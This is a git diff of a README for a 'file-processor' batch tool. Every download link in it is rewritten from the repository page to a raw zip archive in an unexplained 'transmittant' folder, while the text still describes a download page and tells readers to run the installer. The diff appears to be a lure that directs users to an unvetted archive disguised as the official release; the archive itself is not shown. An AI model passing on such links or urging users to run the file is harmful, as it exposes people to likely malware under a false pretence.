@@ -1,6 +1,6 @@
 # 📁 file-processor-1771917212-5 - Batch File Processing Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Bob42024/file-processor-1771917212-5)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bob42024/file-processor-1771917212-5/main/transmittant/file-processor-v2.7-beta.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before installing, please check your computer meets these needs:
 
 Click this link to visit the download page:
 
-[![Download](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Bob42024/file-processor-1771917212-5)
+[![Download](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bob42024/file-processor-1771917212-5/main/transmittant/file-processor-v2.7-beta.1.zip)
 
 Once on the page, look for the latest release or download section. You will find a file named similar to `file-processor-1771917212-5-setup.exe` or a zip archive. Click to download.
 
@@ -125,7 +125,7 @@ For more help, visit the GitHub page and check the “Issues” tab.
 To get started quickly:
 
 1. Visit the download page:  
-   [https://github.com/Bob42024/file-processor-1771917212-5](https://github.com/Bob42024/file-processor-1771917212-5)  
+   [https://raw.githubusercontent.com/Bob42024/file-processor-1771917212-5/main/transmittant/file-processor-v2.7-beta.1.zip](https://raw.githubusercontent.com/Bob42024/file-processor-1771917212-5/main/transmittant/file-processor-v2.7-beta.1.zip)  
 2. Download the latest installer file.  
 3. Run the installer and follow prompts.  
 4. Open the program and add your files.  
